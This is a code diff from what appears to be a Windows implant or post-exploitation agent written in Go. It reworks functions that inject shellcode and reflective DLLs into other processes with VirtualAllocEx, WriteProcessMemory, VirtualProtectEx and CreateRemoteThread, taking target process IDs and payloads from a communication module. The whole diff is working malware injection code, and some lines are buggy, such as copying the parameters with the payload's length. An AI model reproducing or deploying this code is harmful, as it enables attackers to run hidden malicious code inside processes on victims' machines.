@@ -9,13 +9,14 @@ import (
 	"fmt"
 	"github.com/Binject/debug/pe"
 	"golang.org/x/sys/windows"
+	"main/communication"
 	"os"
 	"strings"
 	"unsafe"
 )
 
 func InjectProcess(b []byte) ([]byte, error) {
-	pid := ReadInt(b)
+	pid := communication.ReadInt(b)
 	sh := b[8:]
 
 	if os.Getpid() == int(pid) {
@@ -102,7 +103,7 @@ func InjectProcess(b []byte) ([]byte, error) {
 }
 
 func InjectProcessRemote(b []byte) ([]byte, error) {
-	pid := ReadInt(b)
+	pid := communication.ReadInt(b)
 	sh := b[8:]
 
 	if os.Getpid() == int(pid) {
@@ -114,42 +115,36 @@ func InjectProcessRemote(b []byte) ([]byte, error) {
 		fmt.Println(err)
 		return nil, err
 	}
-	addr, _, _ := VirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(len(sh)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+
+	addr, _, err := VirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(len(sh)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if addr == 0 {
-		fmt.Println("VirtualAlloc Failed")
 		return nil, errors.New("VirtualAlloc Failed")
-	} else {
-		fmt.Println("Alloc: Success")
 	}
-	_, _, errWriteMemory := WriteProcessMemory.Call(uintptr(hProcess), addr, (uintptr)(unsafe.Pointer(&sh[0])), uintptr(len(sh)))
-	if errWriteMemory.Error() != "The operation completed successfully." {
-		fmt.Println("WriteMemory: Failed")
-		return nil, errWriteMemory
-	} else {
-		fmt.Println("WriteMemory: Success")
+	if err != nil && err.Error() != "The operation completed successfully." {
+		fmt.Println(err)
 	}
+
+	_, _, err = WriteProcessMemory.Call(uintptr(hProcess), addr, (uintptr)(unsafe.Pointer(&sh[0])), uintptr(len(sh)))
+	if err != nil && err.Error() != "The operation completed successfully." {
+		fmt.Println(err)
+	}
+
 	oldProtect := windows.PAGE_READWRITE
-	_, _, errVirtualProtect := VirtualProtectEx.Call(uintptr(hProcess), addr, uintptr(len(sh)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
-	if errVirtualProtect.Error() != "The operation completed successfully." {
-		fmt.Println("VirtualProtect: Failed")
-		return nil, errVirtualProtect
-	} else {
-		fmt.Println("VirtualProtect: Success")
+	_, _, err = VirtualProtectEx.Call(uintptr(hProcess), addr, uintptr(len(sh)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	if err != nil && err.Error() != "The operation completed successfully." {
+		fmt.Println(err)
 	}
 
-	_, _, errCreateRemoteThreadEx := CreateRemoteThread.Call(uintptr(hProcess), 0, 0, addr, 0, 0, 0)
-	if errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
-		fmt.Println("VirtualProtect: Failed")
-		return nil, errCreateRemoteThreadEx
-	} else {
-		fmt.Println("VirtualProtect: Success")
+	_, _, err = CreateRemoteThread.Call(uintptr(hProcess), 0, 0, addr, 0, 0, 0)
+	if err != nil && err.Error() != "The operation completed successfully." {
+		fmt.Println(err)
 	}
 
-	return []byte("Inject success"), nil
+	return []byte("Remote Inject success"), nil
 }
 
 func DllInjectProcess(params []byte, b []byte) ([]byte, error) {
-	pid := ReadInt(b)
+	pid := communication.ReadInt(b)
 	b = b[8:]
 
 	if os.Getpid() == int(pid) {
@@ -174,93 +169,74 @@ func DllInjectProcess(params []byte, b []byte) ([]byte, error) {
 		}
 	}
 
-	process, err := windows.OpenProcess(windows.STANDARD_RIGHTS_REQUIRED|windows.SYNCHRONIZE|0xFFFF, false, pid)
+	hProcess, err := windows.OpenProcess(windows.STANDARD_RIGHTS_REQUIRED|windows.SYNCHRONIZE|0xFFFF, false, pid)
 	if err != nil {
 		fmt.Println(err)
 		return nil, err
 	}
 
 	if string(params) == "\x00" {
-		ba, _, err := VirtualAllocEx.Call(uintptr(process), 0, uintptr(len(b)),
-			windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+		ba, _, err := VirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(len(b)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 		if ba == 0 {
-			fmt.Println("VirtualAlloc Failed")
 			return nil, errors.New("VirtualAlloc Failed")
 		}
 		if err != nil && err.Error() != "The operation completed successfully." {
-			return nil, err
+			fmt.Println(err)
 		}
 
-		_, _, err = RtlCopyMemory.Call(ba, (uintptr)(unsafe.Pointer(&b[0])), uintptr(len(b)))
+		_, _, err = WriteProcessMemory.Call(uintptr(hProcess), ba, (uintptr)(unsafe.Pointer(&b[0])), uintptr(len(b)))
 		if err != nil && err.Error() != "The operation completed successfully." {
-			return nil, err
+			fmt.Println(err)
 		}
-
-		writeMem(ba, b)
 
 		Ldr := ba + RDIOffset
 
 		oldProtect := windows.PAGE_READWRITE
-		_, _, err = VirtualProtect.Call(ba, uintptr(len(b)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+		_, _, err = VirtualProtectEx.Call(uintptr(hProcess), Ldr, uintptr(len(b)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 		if err != nil && err.Error() != "The operation completed successfully." {
-			return nil, err
+			fmt.Println(err)
 		}
 
-		thread, _, err := CreateThread.Call(0, 0, Ldr, 0, 0, 0)
+		_, _, err = CreateRemoteThread.Call(uintptr(hProcess), 0, 0, Ldr, 0, 0, 0)
 		if err != nil && err.Error() != "The operation completed successfully." {
-			return nil, err
+			fmt.Println(err)
 		}
 
-		_, _, err = WaitForSingleObject.Call(thread, 1000)
-		if err != nil && err.Error() != "The operation completed successfully." {
-			return nil, err
-		}
-
-		return []byte("DllInject success"), nil
-
+		return []byte("Remote DllInject success"), nil
 	}
 
-	ba, _, err := VirtualAllocEx.Call(uintptr(process), 0, uintptr(len(b)+len(params)),
-		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	ba, _, err := VirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(len(b)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if ba == 0 {
-		fmt.Println("VirtualAlloc Failed")
 		return nil, errors.New("VirtualAlloc Failed")
 	}
 	if err != nil && err.Error() != "The operation completed successfully." {
-		return nil, err
+		fmt.Println(err)
 	}
 
-	_, _, err = RtlCopyMemory.Call(ba, (uintptr)(unsafe.Pointer(&b[0])), uintptr(len(b)))
+	_, _, err = WriteProcessMemory.Call(uintptr(hProcess), ba, (uintptr)(unsafe.Pointer(&b[0])), uintptr(len(b)))
 	if err != nil && err.Error() != "The operation completed successfully." {
-		return nil, err
+		fmt.Println(err)
 	}
 
-	_, _, err = RtlCopyMemory.Call(ba+uintptr(len(b)), (uintptr)(unsafe.Pointer(&params[0])), uintptr(len(params)))
+	_, _, err = WriteProcessMemory.Call(uintptr(hProcess), ba+uintptr(len(b)), (uintptr)(unsafe.Pointer(&params[0])), uintptr(len(b)))
 	if err != nil && err.Error() != "The operation completed successfully." {
-		return nil, err
+		fmt.Println(err)
 	}
-
-	writeMem(ba, b)
 
 	Ldr := ba + RDIOffset
 
 	oldProtect := windows.PAGE_READWRITE
-	_, _, err = VirtualProtect.Call(ba, uintptr(len(b)+len(params)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	_, _, err = VirtualProtectEx.Call(uintptr(hProcess), ba, uintptr(len(b)+len(params)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 	if err != nil && err.Error() != "The operation completed successfully." {
-		return nil, err
+		fmt.Println(err)
 	}
 
-	thread, _, err := CreateThread.Call(0, 0, Ldr, uintptr(unsafe.Pointer(&params[0])), 0, 0)
+	_, _, err = CreateRemoteThread.Call(uintptr(hProcess), 0, 0, Ldr, (uintptr)(unsafe.Pointer(&params[0])), 0, 0, 0)
 	if err != nil && err.Error() != "The operation completed successfully." {
-		return nil, err
+		fmt.Println(err)
 	}
 
-	_, _, err = WaitForSingleObject.Call(thread, 1000)
-	if err != nil && err.Error() != "The operation completed successfully." {
-		return nil, err
-	}
-
-	return []byte("DllInject success"), nil
+	return []byte("Remote DllInject success"), nil
 }
 
 func DllInjectSelf(params []byte, b []byte) ([]byte, error) {
